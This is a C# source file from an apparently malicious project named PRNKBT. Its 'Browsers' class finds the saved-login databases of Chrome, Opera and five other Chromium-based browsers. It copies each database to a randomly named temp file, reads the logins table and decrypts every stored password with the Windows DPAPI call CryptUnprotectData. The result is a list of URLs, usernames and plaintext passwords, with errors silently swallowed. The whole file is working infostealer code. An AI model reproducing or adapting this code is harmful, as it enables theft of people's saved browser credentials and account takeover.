using PRNKBT.Objects;
using PRNKBT.Requirements;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace PRNKBT.Funcitons
{
    class Browsers
    {
        public static List<PassData> GetPasswords() // Works
        {
            List<PassData> passDataList1 = new List<PassData>();
            string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
            string[] strArray = new string[7]
            {
                environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data",
                environmentVariable + "\\Kometa\\User Data\\Default\\Login Data",
                environmentVariable + "\\Orbitum\\User Data\\Default\\Login Data",
                environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Login Data",
                environmentVariable + "\\Amigo\\User\\User Data\\Default\\Login Data",
                environmentVariable + "\\Torch\\User Data\\Default\\Login Data"
            };
            foreach (string basePath in strArray)
            {
                List<PassData> passDataList2 = Browsers.FetchPasswords(basePath);
                if (passDataList2 != null)
                    passDataList1.AddRange((IEnumerable<PassData>)passDataList2);
            }
            return passDataList1;
        }
        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CryptUnprotectData(ref Browsers.DataBlob pCipherText, ref string pszDescription, ref Browsers.DataBlob pEntropy, IntPtr pReserved, ref Browsers.CryptprotectPromptstruct pPrompt, int dwFlags, ref Browsers.DataBlob pPlainText);

        public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
        {
            Browsers.DataBlob pPlainText = new Browsers.DataBlob();
            Browsers.DataBlob pCipherText = new Browsers.DataBlob();
            Browsers.DataBlob pEntropy = new Browsers.DataBlob();
            Browsers.CryptprotectPromptstruct pPrompt = new Browsers.CryptprotectPromptstruct()
            {
                cbSize = Marshal.SizeOf(typeof(Browsers.CryptprotectPromptstruct)),
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero,
                szPrompt = (string)null
            };
            string empty = string.Empty;
            try
            {
                try
                {
                    if (cipherTextBytes == null)
                        cipherTextBytes = new byte[0];
                    pCipherText.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
                    pCipherText.cbData = cipherTextBytes.Length;
                    Marshal.Copy(cipherTextBytes, 0, pCipherText.pbData, cipherTextBytes.Length);
                }
                catch (Exception ex)
                {
                }
                try
                {
                    if (entropyBytes == null)
                        entropyBytes = new byte[0];
                    pEntropy.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
                    pEntropy.cbData = entropyBytes.Length;
                    Marshal.Copy(entropyBytes, 0, pEntropy.pbData, entropyBytes.Length);
                }
                catch (Exception ex)
                {
                }
                Browsers.CryptUnprotectData(ref pCipherText, ref empty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);
                byte[] destination = new byte[pPlainText.cbData];
                Marshal.Copy(pPlainText.pbData, destination, 0, pPlainText.cbData);
                return destination;
            }
            catch (Exception ex)
            {
            }
            finally
            {
                if (pPlainText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pPlainText.pbData);
                if (pCipherText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pCipherText.pbData);
                if (pEntropy.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pEntropy.pbData);
            }
            return new byte[0];
        }

        private static List<PassData> FetchPasswords(string basePath)
        {
            if (!File.Exists(basePath))
                return (List<PassData>)null;
            string str1 = "";
            if (basePath.Contains("Chrome"))
                str1 = "Google Chrome";
            if (basePath.Contains("Yandex"))
                str1 = "Yandex Browser";
            if (basePath.Contains("Orbitum"))
                str1 = "Orbitum Browser";
            if (basePath.Contains("Opera"))
                str1 = "Opera Browser";
            if (basePath.Contains("Amigo"))
                str1 = "Amigo Browser";
            if (basePath.Contains("Torch"))
                str1 = "Torch Browser";
            if (basePath.Contains("Comodo"))
                str1 = "Comodo Browser";
            try
            {
                string str2 = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
                if (File.Exists(str2))
                    File.Delete(str2);
                File.Copy(basePath, str2, true);
                SqlHandler sqlHandler = new SqlHandler(str2);
                List<PassData> passDataList = new List<PassData>();
                sqlHandler.ReadTable("logins");
                for (int rowNum = 0; rowNum < sqlHandler.GetRowCount(); ++rowNum)
                {
                    try
                    {
                        string empty = string.Empty;
                        try
                        {
                            empty = Encoding.UTF8.GetString(Browsers.DecryptBrowsers(Encoding.Default.GetBytes(sqlHandler.GetValue(rowNum, 5)), (byte[])null));
                        }
                        catch (Exception ex)
                        {
                        }
                        if (empty != "")
                            passDataList.Add(new PassData()
                            {
                                Url = sqlHandler.GetValue(rowNum, 1).Replace("https://", "").Replace("http://", ""),
                                Login = sqlHandler.GetValue(rowNum, 3),
                                Password = empty,
                                Program = str1
                            });
                    }
                    catch (Exception ex)
                    {
                        // // //Console.WriteLine(ex.ToString());
                    }
                }
                File.Delete(str2);
                return passDataList;
            }
            catch
            {
                // // //Console.WriteLine(ex.ToString());
                return (List<PassData>)null;
            }
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CryptprotectPromptstruct
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DataBlob
        {
            public int cbData;
            public IntPtr pbData;
        }
    }
}
